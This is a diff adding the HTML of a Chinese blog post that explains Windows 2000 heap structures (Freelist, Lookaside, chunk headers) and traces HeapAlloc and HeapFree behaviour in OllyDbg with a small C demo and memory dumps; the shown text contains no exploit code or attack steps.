@@ -167,6 +167,548 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/20/windows%E5%A0%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/20/windows%E5%A0%86/" class="post-title-link" itemprop="url">windows2000 堆溢出</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-20 22:06:00 / Modified: 22:06:13" itemprop="dateCreated datePublished" datetime="2022-09-20T22:06:00+08:00">2022-09-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="windows堆"><a href="#windows堆" class="headerlink" title="windows堆"></a>windows堆</h1><h2 id="堆数据结构"><a href="#堆数据结构" class="headerlink" title="堆数据结构"></a>堆数据结构</h2><p>windows的堆由堆块和堆表组成</p>
+<p>堆表:一般位于堆区的起始位置,用于索引所有堆块,包括堆块位置,大小,是否空闲</p>
+<p>堆块:性能原因,一般分为大小不同的块.每个堆块都分为两部分,块首和块身.其中块首包含了描述本堆块的信息,包括大小,是否空闲等.块身紧跟在块首后面</p>
+<p>申请堆空间的函数比如malloc,new等,其返回的地址是块身起始地址</p>
+<p>占用的堆块被使用它的程序索引.空闲的堆块被堆表索引</p>
+<h3 id="堆表数据结构"><a href="#堆表数据结构" class="headerlink" title="堆表数据结构"></a>堆表数据结构</h3><p>空闲双向链表<code>Freelist</code>,空表</p>
+<p>快速单向链表<code>Lookaside</code>,快表</p>
+<h3 id="Freelist"><a href="#Freelist" class="headerlink" title="Freelist"></a>Freelist</h3><p>空闲堆块的块首有两个指针,用于将多个堆块链接成双向链表</p>
+<p>堆表区有一个128项的指针数组,空表索引画在图上就长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919081803916.png" alt="image-20220919081803916"></p>
+<p>每个空表索引后面拉着一溜全都是一样大小的堆块</p>
+<p>空表索引<code>free[n]</code>后面拉着的堆块大小都是$n\times 8\ byte$</p>
+<p>特别的是<code>free[0]</code>,其中的堆块都是<code>1024</code>以上的,并且按照大小不降拉溜</p>
+<p>空表索引就是包含<strong>两个指针的结构体</strong>,两个指针分别指向拉溜的头和腚.</p>
+<p>相当于</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FreeListIndex</span>&#123;</span></span><br><span class="line">	FreelistNode * first;</span><br><span class="line">	FreelistNode * last;</span><br><span class="line">&#125;FreeList[<span class="number">128</span>];</span><br></pre></td></tr></table></figure>
+
+<p>意思意思就行了</p>
+<h3 id="Lookaside"><a href="#Lookaside" class="headerlink" title="Lookaside"></a>Lookaside</h3><p>块表用来加速堆分配,块表是单向链表,不会发生堆块合并</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919082249956.png" alt="image-20220919082249956"></p>
+<p>每个lookaside[n]节点,<strong>后面最多拉4个节点</strong></p>
+<p>后面最多拉4个节点,后面最多拉4个节点,后面最多拉4个节点</p>
+<h2 id="堆操作"><a href="#堆操作" class="headerlink" title="堆操作"></a>堆操作</h2><p>对操作分为堆块分配,堆块释放,堆块合并</p>
+<p>其中分配释放是程序员在程序中规定的,堆块合并由数据结构自己管理</p>
+<h3 id="堆块分配"><a href="#堆块分配" class="headerlink" title="堆块分配"></a>堆块分配</h3><p>快表分配,普通空表分配,0号空表分配</p>
+<h4 id="快表分配"><a href="#快表分配" class="headerlink" title="快表分配"></a>快表分配</h4><p>1.找到大小匹配的空闲堆块</p>
+<p>2.将该堆块的状态修改为占用</p>
+<p>3.从堆表中把他卸下,也就是其前驱指向其后继</p>
+<p>4.返回堆块块身首地址给程序指针托管</p>
+<h4 id="普通空表分配"><a href="#普通空表分配" class="headerlink" title="普通空表分配"></a>普通空表分配</h4><p>寻找能够满足空间要求的最小堆块</p>
+<h4 id="零号空表分配"><a href="#零号空表分配" class="headerlink" title="零号空表分配"></a>零号空表分配</h4><p>对于希望分配的空间大小x,首先反向搜索最后一个零号堆块,由于零号空表只增不减,最后一个零号堆块是最大的,如果最大的堆块没有x大,则零号空表分配失败</p>
+<p>否则从头开始寻找第一个可以容纳x的堆块</p>
+<h4 id="空表找零钱现象"><a href="#空表找零钱现象" class="headerlink" title="空表找零钱现象"></a>空表找零钱现象</h4><p>如果没有精确匹配希望分配空间大小的堆块,则拿一个大堆块,精确割出需要的空间大小,然后剩下的重新标注块首链接到空表中</p>
+<p>快表只有精确匹配时才会分配,不会发生找零钱现象</p>
+<h3 id="堆块释放"><a href="#堆块释放" class="headerlink" title="堆块释放"></a>堆块释放</h3><p>1.修改堆块状态为空闲</p>
+<p>2.堆块重新连入堆表末尾</p>
+<h3 id="堆块合并"><a href="#堆块合并" class="headerlink" title="堆块合并"></a>堆块合并</h3><p>将两个块从<strong>空表</strong>卸下,合并堆块,合并块首信息,然后将该堆块重新连入空闲链表</p>
+<p>快表中的空闲块都会被设置为占用状态,不参与堆块合并</p>
+<h4 id="内存紧缩"><a href="#内存紧缩" class="headerlink" title="内存紧缩"></a>内存紧缩</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220919092345723.png" alt="image-20220919092345723"></p>
+<h3 id="堆分配释放算法"><a href="#堆分配释放算法" class="headerlink" title="堆分配释放算法"></a>堆分配释放算法</h3><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220919092818744.png" alt="image-20220919092818744"></p>
+<p>下面调试验证上述数据结构和操作</p>
+<h2 id="堆调试"><a href="#堆调试" class="headerlink" title="堆调试"></a>堆调试</h2><p>书上调试的程序长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//free block and prevent coaleses</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line">	</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第七行用int 3指令下断点让程序停下,从这里附加调试器,因为如果直接从头调试运行的话,堆会装孙子,不使用快表</p>
+<p>首先要了解一下这几个API的作用</p>
+<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="HeapCreate"><a href="#HeapCreate" class="headerlink" title="HeapCreate"></a>HeapCreate</h4><p>在进程地址空间中创建辅助堆</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">HeapCreate</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD  flOptions,<span class="comment">//堆上的操作类型,包括读写执行等</span></span></span><br><span class="line"><span class="params">  [in] SIZE_T dwInitialSize,<span class="comment">//开始时分配给堆的字节数</span></span></span><br><span class="line"><span class="params">  [in] SIZE_T dwMaximumSize<span class="comment">//堆最大的字节数,0则表示无上限</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>返回值是该堆空间的句柄,也就是基地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样用的意思是,没有访问限制,初始时分给0x1000字节的堆空间,最大可以要0x10000字节的堆空间,将该堆空间的句柄交给hp变量保管</p>
+<h4 id="HeapAlloc"><a href="#HeapAlloc" class="headerlink" title="HeapAlloc"></a>HeapAlloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DECLSPEC_ALLOCATOR LPVOID <span class="title function_">HeapAlloc</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hHeap,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFlags,</span></span><br><span class="line"><span class="params">  [in] SIZE_T dwBytes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>hHeap是堆空间的句柄,可以是HeapCreate或者GetProcessHeap的返回值</p>
+<p>其中HeapCreate是我们手动申请的堆空间,GetProcessHeap是进程堆空间,这个在程序运行开始就有了</p>
+<p>如果函数调用成功则返回申请空间的基地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样用的意思是,从刚才HeapCreate创建的堆空间中要一块3字节的空间,该块空间将会被初始化为0</p>
+<h4 id="HeapFree"><a href="#HeapFree" class="headerlink" title="HeapFree"></a>HeapFree</h4><p>释放HeapAlloc或者HeapReAlloc申请的堆空间</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">HeapFree</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE                 hHeap,</span></span><br><span class="line"><span class="params">  [in] DWORD                  dwFlags,</span></span><br><span class="line"><span class="params">  [in] _Frees_ptr_opt_ LPVOID lpMem</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br></pre></td></tr></table></figure>
+
+<p>将h1这一小块还给hp</p>
+<h3 id="哪一块是堆"><a href="#哪一块是堆" class="headerlink" title="哪一块是堆?"></a>哪一块是堆?</h3><p>ollydbg起来实时调试时,程序是停在0x40101D这个地方的</p>
+<p>在反汇编视图上INT3发生于调用HeapCreate函数之后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171320225.png" alt="image-20220919171320225"></p>
+<p>显然此时EAX就存放的HeapCreate的返回值,即hp句柄,也就是申请的堆空间的基地址0x390000,显然是一个用户地址空间的值</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171420641.png" alt="image-20220919171420641"></p>
+<p>在内存界面上它长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171519939.png" alt="image-20220919171519939"></p>
+<p>大小0x1000是我们给CreateHeap指定的初始值</p>
+<p>双击该地址到内存视图看看</p>
+<p>从0x390000开始,堆表中一次是段表索引,虚表索引,空表使用标识,空表索引区</p>
+<h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><p><img src="/WPS%E5%9B%BE%E7%89%87%E6%8B%BC%E5%9B%BE.png" alt="WPS图片拼图"></p>
+<p>两者的区别主要在于[8,16)字节,由于占用态的堆块已经从空闲链表中取下,因此不需要再维护前后指针</p>
+<p>空闲态堆块尚未填充数据,因此这两个字节分别用于前后指针</p>
+<p>当占用态的堆块要归还的时候,这两个字节又得存放指针</p>
+<p>调试时,0x390688这里是Flink in freelist的位置,而真正的堆块起始位置应该在往前8个字节,即0x390680位置</p>
+<p>一般引用堆块的指针都是会越过8字节的头部</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919192556999.png" alt="尾块头部"></p>
+<table>
+<thead>
+<tr>
+<th>块首属性</th>
+<th>值</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Self Size</td>
+<td>0x130</td>
+<td>该尾块的data区大小<code>0x130*8=0x980</code>字节<br />注意单位是8字节,并且这0x980是包括堆块头部的</td>
+</tr>
+<tr>
+<td>Previous chunk</td>
+<td>0x80</td>
+<td></td>
+</tr>
+<tr>
+<td>Segment</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td>Flags</td>
+<td>0x10</td>
+<td></td>
+</tr>
+<tr>
+<td>Unused bytes</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td>Tag Index</td>
+<td>0</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>Flink in freelist和Blink in freelist此时都是指向Freelist[0]这个索引项的</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" alt="Freelist[0]"></p>
+<p>左手拉右手,右手拽左手</p>
+<p>然后后面全都是0,因为尚未使用</p>
+<p>堆块的行为</p>
+<p>1.堆块大小包括了块块首,申请32字节,实际分配堆块40字节,前8字节是堆块首.返回的指针指向第9字节(下标8)</p>
+<p>2.堆块的单位是8字节,不足八字节的按照八字节分配</p>
+<p>3.初始状态下快表和空表都是空,只有一个Freelist[0]后面拉着一个尾块,这个尾块在堆偏移0x688处</p>
+<p>4.分配的时候从尾块头上(整个尾块包括尾块首都得换地方)开始切,切走之后要修改尾块块首的Self Size信息,并且将新的尾块data地址交给freelist[0]</p>
+<h3 id="调试观察空表"><a href="#调试观察空表" class="headerlink" title="调试观察空表"></a>调试观察空表</h3><h4 id="空表索引区Freelist-128"><a href="#空表索引区Freelist-128" class="headerlink" title="空表索引区Freelist[128]"></a>空表索引区Freelist[128]</h4><p>空表索引区位于偏移0x178处,即0x390178</p>
+<p>一个刚初始化的堆,其状态如下</p>
+<p>1.只有一个空闲大块,叫做尾块</p>
+<p>2.该尾快位于堆偏移0x688处</p>
+<p>3.Freelist[0]指向”尾块”</p>
+<p>4.除零号空表索引外,其余各项索引指向自己,即没有空闲块</p>
+<p>空表索引,即Freelist表,其第0项的偏移就是Freelist表的偏移,0x178+0x390000&#x3D;0x390178,这个位置长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" alt="image-20220919184326162"></p>
+<p>Freelist[0]上只挂着尾块,因此前后指针都是指向尾块的,尾块的地址是0x00390688,即堆偏移0x688的地方</p>
+<p>其他的空表索引Freelist[n]的两个指针都是指向自己,整个Freelist数组一共有128项,每项两个4字节指针,共<code>128*4*2=1024=0x400</code>字节,从0x390178到0x390578全都是Freelist</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919190028685.png" alt="image-20220919190028685"></p>
+<p>一直持续到0x390578</p>
+<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220919190022123.png" alt="image-20220919190022123"></p>
+<h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><p>重新从win2k上用od调试了一下,现在堆基址是0x360000</p>
+<p>下面是六次分割</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>堆句柄</th>
+<th>希望请求字节数</th>
+<th>实际分配堆块的字节数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>h1</td>
+<td>3</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h2</td>
+<td>5</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h3</td>
+<td>6</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h4</td>
+<td>8</td>
+<td>16</td>
+</tr>
+<tr>
+<td>h5</td>
+<td>19</td>
+<td>32</td>
+</tr>
+<tr>
+<td>h6</td>
+<td>24</td>
+<td>32</td>
+</tr>
+</tbody></table>
+<h5 id="分割之前"><a href="#分割之前" class="headerlink" title="分割之前"></a>分割之前</h5><p>分割之前的尾块</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202335032.png" alt="image-20220919202335032"></p>
+<p>flags&#x3D;0x10表示尾块</p>
+<h5 id="第一次分割"><a href="#第一次分割" class="headerlink" title="第一次分割"></a>第一次分割</h5><p>第一次分割时</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919202432017.png" alt="image-20220919202432017"></p>
+<p>ESI作为第一个参数,是CreateHeap返回的堆句柄0x360000</p>
+<p>8是要初始化该片空间为0,实际是枚举值HEAP_ZERO_MEMORY</p>
+<p>3是希望申请的字节数</p>
+<p>edi中放着的是AllocateHeap函数的地址</p>
+<p>call edi之后0x360680附近发生了变化</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919204334903.png" alt="image-20220919204334903"></p>
+<p>call的返回值放在eax中,此时为0x360688,这意味着h1堆块data地址,这是原来的尾块data</p>
+<p>那么h1堆块首就得在0x360680了,这是原来的尾块首</p>
+<p>h1堆块首中的数据:</p>
+<p>大小0x0002,(单位8字节),即16字节</p>
+<p>上一个块的大小0x0008(啥意义呢?)</p>
+<p>Flags&#x3D;01,busy</p>
+<p>unused bytes&#x3D;0x0D,13个字节?</p>
+<p>然后h1堆块数据的前四个字节确实置零了,但是后面四个字节依然保持着尾块首留下的指针,因为我们只希望申请3个字节,本来给16个字节其中data占8字节就已经是为了遵守硬性要求,8字节对齐了,前四个字节够用了,后面四个字节不用清零</p>
+<p>尾块此时的大小0x12E相比于0x130少了2(单位8字节),正好是h1堆块首和data的大小,尾块的第二个八字节依然是两个指针,指向freelist[0]</p>
+<p>此时freelist[0]@0x00360178其上的值也修改了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919205258485.png" alt="image-20220919205258485"></p>
+<p>实时修改为当前尾块data地址</p>
+<h5 id="六次分割后"><a href="#六次分割后" class="headerlink" title="六次分割后"></a>六次分割后</h5><p>继续调试,直到六次分配完成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2,希望5字节于是只有data前5字节初始化为0</span><br><span class="line">003606A0  02 00 02 00 00 01 0A 00 00 00 00 00 00 00 36 00  ...........6.//h3,希望6字节于是只有data前6字节初始化为0</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 01 0D 00 00 00 00 00 00 00 00 00  .............//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//尾块</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360720  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure>
+
+<p>此时尾块大小已经减为0x120(单位8字节),其两个指针仍然是指向0x00360178,</p>
+<p>freelist[0]@0x00360178的两个指针必然也指向了0x360708</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919210617841.png" alt="image-20220919210617841"></p>
+<p>被申请走的堆块,对于系统中的堆来说,算是平白无故就没了,无法通过任何方式索引到拿走的堆块,只有是用户程序归还的时候,系统才可以把堆块重新放到Freelist里面,这时候就不是放到尾块里面了,16字节的块(包括首部)应该放到freelist[2]</p>
+<h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><h5 id="释放h1"><a href="#释放h1" class="headerlink" title="释放h1"></a>释放h1</h5><p>释放是从h1开始的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line"></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919211337324.png" alt="image-20220919211337324"></p>
+<p>esi&#x3D;0x360000是hp句柄</p>
+<p>dwflags&#x3D;0没有任何标志</p>
+<p>ebx是h1句柄,这里貌似有一个编译优化,在h1堆申请完毕之后,h1句柄是放在eax中的,在h2堆申请之前,eax又放到了ebx中,从那到现在ebx中一直都是h1句柄没有改变</p>
+<p>调用之后eax&#x3D;1,表示执行成功</p>
+<p>此时的 h1堆块@0x360680发生了变化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">释放之前</span><br><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">释放之后</span><br><span class="line">00360680  02 00 08 00 00 00 0D 00 88 01 36 00 88 01 36 00  ......?6.?6.</span><br></pre></td></tr></table></figure>
+
+<p>其变化为,标志位又回归0,表示空闲,第二个八字节,原来是data的开始现在又变成了两个指针,都指向0x00360188</p>
+<p>这是啥位置呢?</p>
+<p>Freelist@0x00360178,</p>
+<p>Freelist[0]@0x00360178</p>
+<p>Freelist[1]@0x00360180</p>
+<p>Freelist[2]@0x00360188</p>
+<p>即原来的h1所在堆块,现在链接回了Freelist[2]上</p>
+<blockquote>
+<p>有意思的是,8字节的堆块首+8字节的data,已经是占用堆块的最小规格了,最小规格的堆块释放之后才能挂到Freelist[2]上,那么Freelist[1]上应该挂什么呢?</p>
+<p>如果根据Freelist[n]指向的堆块大小为8n(包括堆块首和堆块data),那么Freelist[1]指向的堆块应该是8字节的首+0字节的data,这个堆块是个寂寞吧</p>
+</blockquote>
+<h5 id="前三次释放后"><a href="#前三次释放后" class="headerlink" title="前三次释放后"></a>前三次释放后</h5><p>前三次释放分别是h1,h3,h5,这是三个不连续的堆块,不会发生合并</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//三次释放前</span><br><span class="line">00360680  02 00 08 00 00 01 0D 00 00 00 00 00 78 01 36 00  .........x6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2,希望5字节于是只有data前5字节初始化为0</span><br><span class="line">003606A0  02 00 02 00 00 01 0A 00 00 00 00 00 00 00 36 00  ...........6.//h3,希望6字节于是只有data前6字节初始化为0</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 01 0D 00 00 00 00 00 00 00 00 00  .............//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//尾块</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//三次释放后</span><br><span class="line">00360680  02 00 08 00 00 00 0D 00 A8 06 36 00 88 01 36 00  ......?6.?6.//h1</span><br><span class="line">00360690  02 00 02 00 00 01 0B 00 00 00 00 00 00 01 36 00  .........6.//h2</span><br><span class="line">003606A0  02 00 02 00 00 00 0A 00 88 01 36 00 88 06 36 00  ......?6.?6.//h3</span><br><span class="line">003606B0  02 00 02 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h4</span><br><span class="line">003606C0  04 00 02 00 00 00 0D 00 98 01 36 00 98 01 36 00  ......?6.?6.//h5</span><br><span class="line">003606D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">003606E0  04 00 04 00 00 01 08 00 00 00 00 00 00 00 00 00  ............//h6</span><br><span class="line">003606F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00360700  20 01 04 00 00 10 00 00 78 01 36 00 78 01 36 00   ....x6.x6.//尾块</span><br><span class="line">00360710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>三次释放前后h2,h4,h6没有发生任何变化,尾块也没有发生任何变化</p>
+<p>三次释放前后发生变化的有h1,h3,h5,发生的变化也是很有规律的,首先是flag从1到0,意思是从占用到空闲</p>
+<p>每个堆块的第二个八字节,都变成了两个指针</p>
+<table>
+<thead>
+<tr>
+<th>释放堆块</th>
+<th>释放后的前一个指针值</th>
+<th>释放后的后一个指针值</th>
+</tr>
+</thead>
+<tbody><tr>
